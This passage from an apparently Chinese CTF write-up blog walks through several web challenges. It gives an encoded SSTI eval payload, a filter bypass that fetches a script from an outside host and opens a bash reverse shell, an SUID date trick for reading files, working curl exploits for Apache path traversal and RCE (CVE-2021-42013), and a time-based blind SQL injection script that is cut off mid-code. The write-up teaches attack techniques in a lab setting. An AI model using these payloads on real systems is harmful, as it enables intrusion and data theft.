+</div><p>对字符串进行 ASCII 编码绕过，有：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x62\x61\x73\x65\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f</span><span class="s1">&#39;</span><span class="p">]()[</span><span class="mi">166</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x69\x6e\x69\x74\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x65\x76\x61\x6c</span><span class="s1">&#39;</span><span class="p">](</span><span class="s1">&#39;</span><span class="se">\x6f\x70\x65\x6e\x28\x27\x2e\x2e\x2f\x66\x6c\x61\x67\x5f\x69\x6e\x5f\x68\x33\x72\x33\x5f\x35\x32\x64\x61\x61\x64\x27\x29\x2e\x72\x65\x61\x64\x28\x29</span><span class="s1">&#39;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>网页端得到 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{01089939-9f12-4c7a-a50d-76f626381e39}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="so-baby-rce-again" class="headerLink">
+    <a href="#so-baby-rce-again" class="header-mark"></a>So Baby RCE Again</h3><p>访问靶机网址，WebShell 过滤了关键字 <code>bash</code> 和 <code>curl</code>，可使用两点号<code>``</code>绕过。</p>
+<p>构造 payload <code>bash -i &amp;&gt; /dev/tcp/47.97.152.130/54188 0&gt;&amp;1</code> 作为 <code>cmd</code> 参数发现并不行，没找到原因。</p>
+<p>尝试在公网服务器上挂载脚本，并在靶机上 <code>curl</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -o shell.sh 47.97.152.130:54180
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>即传参 <code>?cmd=cu``rl%20-o%20shell.sh%2047.97.152.130:54180</code></p>
+<p>在公网服务器上使用 nc 监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@Cnkid03~<span class="o">]</span>$ nc -lvp <span class="m">54188</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在靶机上</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash shell.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>即传参 <code>?cmd=bas``h%20shell.sh</code></p>
+<p>回到我们的公网服务器，发现已经拿到 shell.</p>
+<p>进行常规的查找 flag 操作，易得 flag 存在于根目录中，进行 cat 操作</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@out:/$ cat ffll444aaggg
+</span></span><span class="line"><span class="cl">cat: ffll444aaggg: Permission denied
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>是的，shell 那么容易就拿到，出题人不会就此善罢甘休的。</p>
+<p>考虑提权。查找具有 SUID 的文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@out:/$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/bin/date
+</span></span><span class="line"><span class="cl">/bin/mount
+</span></span><span class="line"><span class="cl">/bin/su
+</span></span><span class="line"><span class="cl">/bin/umount
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>date</code> 具有 <code>-file</code> 选项，考虑劫持 <code>date</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@out:/$ date -f /ffll444aaggg
+</span></span><span class="line"><span class="cl">date: invalid date <span class="s1">&#39;flag{4a7e06cd-29ab-491c-a1ff-478427e3b92a}&#39;</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获得 flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{4a7e06cd-29ab-491c-a1ff-478427e3b92a}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="unsafe-apache" class="headerLink">
+    <a href="#unsafe-apache" class="header-mark"></a>Unsafe Apache</h3><p>靶机地址为 <code>node4.buuoj.cn:27256</code>，访问靶机，内容仅仅是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>It works!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>没有什么可以传参或上传的地方。</p>
+<p>查看响应标头</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Accept-Ranges: bytes
+</span></span></span><span class="line"><span class="cl"><span class="err">Connection: keep-alive
+</span></span></span><span class="line"><span class="cl"><span class="err">Date: Fri, 21 Oct 2022 15:12:37 GMT
+</span></span></span><span class="line"><span class="cl"><span class="err">Etag: &#34;2d-432a5e4a73a80&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">Keep-Alive: timeout=4
+</span></span></span><span class="line"><span class="cl"><span class="err">Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
+</span></span></span><span class="line"><span class="cl"><span class="err">Proxy-Connection: keep-alive
+</span></span></span><span class="line"><span class="cl"><span class="err">Server: Apache/2.4.50 (Unix)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现 Web 服务器为 Apache，版本为 2.4.50（使用 Wappalyzer 可快速得知该信息）。</p>
+<p>Apache 2.4.49 和 2.4.50 版本存在路径穿越和远程代码执行漏洞，即可以通过特定手段访问类似 <code>http(s)://ip:port/dir/../../../etc/passwd</code> 的地址读取到 Web 服务根目录以外的文件（<code>dir</code> 必须存在且可访问）。</p>
+<h4 id="cve-2021-41773" class="headerLink">
+    <a href="#cve-2021-41773" class="header-mark"></a>CVE-2021-41773</h4><p>Apache 2.4.49 使用的 <code>ap_normalize_path</code> 函数解析路径时会对路径进行 URL 解码，然后过滤掉 <code>../</code> 等路径穿越符。</p>
+<p>但是该函数对路径穿越符的过滤是通过检测解析后的点号后面是否存在 <code>.</code>，因此 <code>%2e.</code> 会被过滤而 <code>.%2e</code> 和 <code>%2e%2e</code> 不会（估计作者当时是考虑文件后缀名忽略了 <code>..</code> 的情况）</p>
+<h4 id="cve-2021-42013" class="headerLink">
+    <a href="#cve-2021-42013" class="header-mark"></a>CVE-2021-42013</h4><p>Apache 2.4.50 的修复并不彻底，虽然过滤了 <code>.%2e</code> <code>%2e%2e</code> 但是…… 二次编码仍然可以绕过。</p>
+<p><code>2</code> 的 URLEncode 结果为 <code>%32</code>，故我们可以用 <code>.%%32e</code> 或者 <code>%%32e%%32e</code> 进行路径穿越。</p>
+<h4 id="路径穿越测试" class="headerLink">
+    <a href="#%e8%b7%af%e5%be%84%e7%a9%bf%e8%b6%8a%e6%b5%8b%e8%af%95" class="header-mark"></a>路径穿越测试</h4><p>访问 <code>http://node4.buuoj.cn:27256/icons/a.png</code> 得到图片，可知存在 <code>icons</code> 目录。</p>
+<p>执行（<code>.%%32e/</code> 写多点以确保到达根目录）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://node4.buuoj.cn:27256/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试成功！</p>
+<h4 id="rce-测试" class="headerLink">
+    <a href="#rce-%e6%b5%8b%e8%af%95" class="header-mark"></a>RCE 测试</h4><p>获取根目录下的 <code>flag</code> 文件失败，我们无从知道 flag 放到哪，文件名是什么，是否需要提权等。因此拿到 shell 是万全之策。</p>
+<p>访问 <code>http://node4.buuoj.cn:27256/cgi-bin/printenv</code> 没有返回 <code>404</code>，可知存在 <code>cgi-bin</code> 目录，因此可实现远程代码执行获取 shell.</p>
+<p>执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -v --data <span class="s2">&#34;echo;echo &#39;bash -i &amp;&gt; /dev/tcp/47.97.152.130/54188 0&gt;&amp;1&#39;&gt;&gt; /tmp/shell.sh&#34;</span> http://node4.buuoj.cn:27256/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中 <code>47.97.152.130</code> 和 <code>54188</code> 分别为主控机 IP 和监听端口。</p>
+<p>查看是否注入成功</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --data <span class="s2">&#34;echo;ls /tmp&#34;</span> http://node4.buuoj.cn:27256/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在返回结果中已经存在 <code>shell.sh</code>， 故在主控机上 <code>nc -lvp 54188</code>，然后执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --data <span class="s2">&#34;echo;bash /tmp/shell.sh&#34;</span> http://node4.buuoj.cn:27256/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到 shell.</p>
+<p>执行 <code>ls /</code> 找到 flag 并 <code>cat</code> 得到 flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">daemon@out:/$ cat ffffllllaaagggg_cc084c485d
+</span></span><span class="line"><span class="cl">flag<span class="o">{</span>c5b66e3b-404d-49eb-a970-0c0c7fa0f2db<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>事实上将 <code>--data</code> 设定为 <code>echo;ls /</code> 进行 RCE 即可获得到 flag 的位置和文件名，然后使用路径穿越或 RCE 均可读到 flag 的内容。</p>
+<h4 id="references-2" class="headerLink">
+    <a href="#references-2" class="header-mark"></a>References</h4><ul>
+<li><a href="https://blog.csdn.net/qq_60905276/article/details/125163219" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/qq_60905276/article/details/125163219</a></li>
+<li><a href="https://httpd.apache.org/security/vulnerabilities_24.html" target="_blank" rel="noopener noreferrer">https://httpd.apache.org/security/vulnerabilities_24.html</a></li>
+<li><a href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20HTTP%20Server%202.4.49%20%e8%b7%af%e5%be%84%e7%a9%bf%e8%b6%8a%e6%bc%8f%e6%b4%9e%20CVE-2021-41773.md" target="_blank" rel="noopener noreferrer">https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20HTTP%20Server%202.4.49%20路径穿越漏洞%20CVE-2021-41773.md</a></li>
+</ul>
+<h3 id="find-round" class="headerLink">
+    <a href="#find-round" class="header-mark"></a>Find round</h3><p>基础注入测试一下，发现其过滤掉了空格和井号。其中空格可以使用 <code>%0C</code> 绕过。</p>
+<p>注入一些 SQL 发现其没有回显。</p>
+<p>解决这种情况有两种方式，一种是 DNSlog，另一种是 sleep 盲注。但是经过测试本题无法使用 SQL 语句中的 <code>load_file</code>，故无法使用 DNSlog.</p>
+<p>根据 IF 语句的语法 <code>if(表达式, 若真, 若假)</code> 使用 payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现网页加载时间明显变慢。利用这一特性，写 Python 脚本，定义一些工具函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Copyright (c) 2022 Cnily03</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 字母表</span>
+</span></span><span class="line"><span class="cl"><span class="n">ALPHABET</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="si">{}</span><span class="s2">!?-_ @#/</span><span class="se">\\</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 靶机地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://a4987151-d67a-4396-b3d4-10fa0937cba5.node4.buuoj.cn:81/comments.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 请求发送间隔</span>
+</span></span><span class="line"><span class="cl"><span class="n">SLEEP_INTERVAL</span> <span class="o">=</span> <span class="mf">0.001</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 几秒内未收到响应视为 if 判真</span>
+</span></span><span class="line"><span class="cl"><span class="n">REQUEST_TTL</span> <span class="o">=</span> <span class="mf">0.8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_pass</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;测试 payload 是否有效
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">URL</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">REQUEST_TTL</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_int</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">R</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">log_result</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;枚举整数直到匹配成功
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Args:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        payload (str): 接受一个 Format 位的字符串，以</span><span class="si">{}</span><span class="s2">代替整数
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">R</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">URL</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">REQUEST_TTL</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">log</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Number </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> missed.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sleep</span><span class="p">(</span><span class="n">SLEEP_INTERVAL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">log_result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;The matched number is </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_char</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">index</span><span class="o">=-</span><span class="mi">1</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">log_result</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;枚举字母表直到匹配成功
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Args:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        payload (str): 接受一个 Format 位的字符串，以</span><span class="si">{}</span><span class="s2">代替字符
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">ALPHABET</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">URL</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">index</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">char</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">char</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
